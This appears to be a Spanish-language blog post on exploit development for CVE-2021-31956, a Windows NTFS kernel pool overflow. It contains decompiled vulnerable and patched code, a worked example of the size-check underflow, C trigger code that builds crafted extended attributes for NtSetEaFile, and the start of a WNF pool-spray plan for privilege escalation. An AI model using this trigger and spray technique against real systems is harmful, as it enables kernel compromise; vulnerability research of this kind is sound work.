---
layout: post
title: Exploit Development y Analisis de CVE-2021-31956 NTFS Windows Kernel Pool Overflow
---

La vulnerabilidad se encuentra en el componente ntfs.sys dentro de la funcion NtfsQueryEaUserEaList, podemos ver el codigo vulnerable y el parche.

Funcion Vulnerable:

``` c
__int64 __fastcall NtfsQueryEaUserEaList(__int64 a1, __int64 eas_blocks_for_file, __int64 a3, __int64 out_buf, unsigned int out_buf_length, unsigned int *a6, char a7)
{

  unsigned int padding; // er15
  padding = 0;


   for ( i = a6; ; i = (unsigned int *)((char *)i + *i) )
    {
      if ( i == v11 )
      {
        v15 = occupied_length;
        out_buf_pos = (_DWORD *)(out_buf + padding + occupied_length);
        if ( (unsigned __int8)NtfsLocateEaByName(
                                ea_blocks_for_file,
                                *(unsigned int *)(a3 + 4),
                                &DestinationString,
                                &ea_block_pos) )
        {
          ea_block = (FILE_FULL_EA_INFORMATION *)(ea_blocks_for_file + ea_block_pos);
          ea_block_size = ea_block->EaNameLength + ea_block->EaValueLength + 9;           // un atacante lo puede manipular
          if ( ea_block_size <= out_buf_length - padding )                                //  esta verficacion es donde se produce el desbordamiento
          {
            memmove(out_buf_pos, ea_block, ea_block_size);
            *out_buf_pos = 0;
            goto LABEL_8;
          }
        }

           *((_BYTE *)out_buf_pos + *((unsigned __int8 *)v11 + 4) + 8) = 0;
LABEL_8:
            v18 = ea_block_size + padding + v15;
            occupied_length = v18;
            if ( !a7 )
            {
              if ( v23 )
                *v23 = (_DWORD)out_buf_pos - (_DWORD)v23;
              if ( *v11 )
              {
                v23 = out_buf_pos;
                out_buf_length -= ea_block_size + padding;
                padding = ((ea_block_size + 3) & 0xFFFFFFFC) - ea_block_size;
                goto LABEL_24;
              }


```

El parche:

``` c
 v12 = *v11;
    v13 = *((unsigned __int8 *)v11 + 4);
    v22 = *v11 + v8;
    for ( i = a6; ; i = (unsigned int *)((char *)i + *i) )
    {
      if ( i == v11 )
      {
        v15 = occupied_length;
        out_buf_pos = (_DWORD *)(out_buf + padding + occupied_length);
        if ( (unsigned __int8)NtfsLocateEaByName(
                                ea_blocks_for_file,
                                *(unsigned int *)(a3 + 4),
                                &DestinationString,
                                &ea_block_pos) )
        {
          ea_block = (ea_block *)(ea_blocks_for_file + ea_block_pos);
          ea_block_size = ea_block->EaNameLength + ea_block->EaValueLength + 9; 
          if ( ea_block_size + padding <= out_buf_length )// vemos que aca tenemos la correccion
          {
            memmove(out_buf_pos, ea_block, ea_block_size);
            *out_buf_pos = 0;
            goto LABEL_8;
          }
        }
        else
        {
```



Volvamos a la funcion vulnerable:



``` c
  ea_block = (FILE_FULL_EA_INFORMATION *)(ea_blocks_for_file + ea_block_pos);
          ea_block_size = ea_block->EaNameLength + ea_block->EaValueLength + 9;           // un atacante lo puede manipular
          if ( ea_block_size <= out_buf_length - padding )                                //  esta verficacion es donde se produce el desbordamiento
          {
            memmove(out_buf_pos, ea_block, ea_block_size);
            *out_buf_pos = 0;
            goto LABEL_8;
          }
        }

           *((_BYTE *)out_buf_pos + *((unsigned __int8 *)v11 + 4) + 8) = 0;
LABEL_8:
            v18 = ea_block_size + padding + v15;
            occupied_length = v18;
            if ( !a7 )
            {
              if ( v23 )
                *v23 = (_DWORD)out_buf_pos - (_DWORD)v23;
              if ( *v11 )
              {
                v23 = out_buf_pos;
                out_buf_length -= ea_block_size + padding;
                padding = ((ea_block_size + 3) & 0xFFFFFFFC) - ea_block_size;
                goto LABEL_24;
              }
```

Vemos que recorre cada atributo EA y lo copia en el bloque de el pool que se asigno anteriormente, el cual tenemos control de su tamaño tambien  y el tamaño de cada copia es ea_block->EaValueLenght + ea_blocal->EaNameLength + 9.

La estructura ea_block es la siguiente:

```c
typedef struct _FILE_FULL_EA_INFORMATION {
  ULONG  NextEntryOffset; 
  UCHAR  Flags;
  UCHAR  EaNameLength; 
  USHORT EaValueLength;
  CHAR   EaName[1];
} FILE_FULL_EA_INFORMATION, *PFILE_FULL_EA_INFORMATION;
```


Vemos que hay una verficacion  antes de cada copia que es:

``` c
ea_block_size <= out_buf_length - padding

```
out_buf_length se pasa como parametro y disminuye cada loop.


La variable padding esta calculado por la siguiente operacion ((ea_block_size + 3) 0xFFFFFFFC) - ea_block_size , por lo que tenemos control sobre ella.

Luego out_buf_pos es el bloque de memoria asignado en el pool donde se va a copiar la inforamcion que se asigna en la funcion NtfsCommonQueryEa y va a desbordarse.

Tambien tenemos control sobre EaNameLength y EaValueLength.


Pongamos un ejemplo de desborde:

supongamos que pasamos los siguiente valores para el primer loop:


```c
EaNameLength = 5
EaValueLength = 4

ea_block_size = 9 + 5 + 4 // 18
padding = 0

por lo que la verficacion sera:
18 <= 18 - 0 .

out_buf_length = 18 - 18 + 0 
out_buf_length = 0.

padding = ((18+3)   0xFFFFFFFC) - 18
padding = 2

```

Luego nuestro segundo atributo extendido:

```c
EaNameLength = 5
EaValueLength = 47

ea_block_size = 5 + 47 + 9
ea_block_size = 137

ea_block_size <= out_buf_length - padding
la verificacion da  137 <= 0 - 2

```

Va a superar la verficacion y se va copiar 137 bytes al final de buffer por lo que va a desbordar el bloque de memoria contiguo.


Primero para que ocurra todo esto se asigna el bloque de memoria en el pool paginado que va a desbordarse en la funcion NtfsCommonQueryEa y nosotros tenemos control de el tamaño de este bloque, entonces para triggerear esta vulnerabilidad nesesitamos llamar desde userspace a la funcion NtQueryEaFile que nos va a llevar al codigo vulnerable pero primero nesesitamos llamar a la funcion NtSetEaFile para  construir un archivo de atributos extendidos NTFS y luego pasarselo como argumento a la funcion NtQueryEaFile.

El codigo va  a quedar asi:

```c
curEa = (PFILE_FULL_EA_INFORMATION)payLoad;

curEa->Flags = 0;
curEa->EaNameLength = 3;
curEa->EaValueLength = 162;
		
curEa->NextEntryOffset = (curEa->EaNameLength + curEa->EaValueLength + 3 + 9) & (~3);
memcpy(curEa->EaName, ".PA", 3);
RtlFillMemory(curEa->EaName + curEa->EaNameLength + 1, 162, 0x41);

curEa = (PFILE_FULL_EA_INFORMATION)((PUCHAR)curEa + curEa->NextEntryOffset);
curEa->NextEntryOffset = 0;
curEa->Flags = 0;
 
curEa->EaNameLength = 4;
curEa->EaValueLength = 0xF;
memcpy(curEa->EaName, ".PBB", 4);
RtlFillMemory(curEa->EaName + curEa->EaNameLength + 1, 0xf, 0);

pd = (PUCHAR)(curEa);


NTSTATUS Status = NtSetEaFile(hFile, &eaStatus, payLoad, sizeof(payLoad));


```



Ahora usaremos los objetos WNF  Windows Notification Facility, vamos a  sprayear el paged pool  y  sobreescribir su estructura  con el desbordamiento para lograr la escalada de privilegios.

Vamos a nesesitar sprayear el pool con dos estructuras que son _WNF_NAME_INSTANCE y _WNF_STATE_DATA.

```c

nt!_WNF_STATE_DATA
   +0x000 Header           : _WNF_NODE_HEADER
   +0x004 AllocatedSize    : Uint4B
   +0x008 DataSize         : Uint4B
   +0x00c ChangeStamp      : Uint4B
```

```c
nt!_WNF_NAME_INSTANCE
   +0x000 Header           : _WNF_NODE_HEADER
   +0x008 RunRef           : _EX_RUNDOWN_REF
   +0x010 TreeLinks        : _RTL_BALANCED_NODE
   +0x028 StateName        : _WNF_STATE_NAME_STRUCT
   +0x030 ScopeInstance    : Ptr64 _WNF_SCOPE_INSTANCE
   +0x038 StateNameInfo    : _WNF_STATE_NAME_REGISTRATION
   +0x050 StateDataLock    : _WNF_LOCK
   +0x058 StateData        : Ptr64 _WNF_STATE_DATA
   +0x060 CurrentChangeStamp : Uint4B
   +0x068 PermanentDataStore : Ptr64 Void
   +0x070 StateSubscriptionListLock : _WNF_LOCK
   +0x078 StateSubscriptionListHead : _LIST_ENTRY
   +0x088 TemporaryNameListEntry : _LIST_ENTRY
   +0x098 CreatorProcess   : Ptr64 _EPROCESS
   +0x0a0 DataSubscribersCount : Int4B
   +0x0a4 CurrentDeliveryCount : Int4B

```

Estas estructuras son allocadas en el pool paginado por medio de las funciones NtCreateWnfStateName and NtUpdateWnfStateData, nesesitamos asignar estas dos estrcuturas y que nuestra memoria quede confirgurada de la siguiente manera:

![Configuracion de memoria](https://github.com/GabrielDurdiak/GabrielDurdiak.github.io/blob/master/images/NTFS%20CHUNK.png)
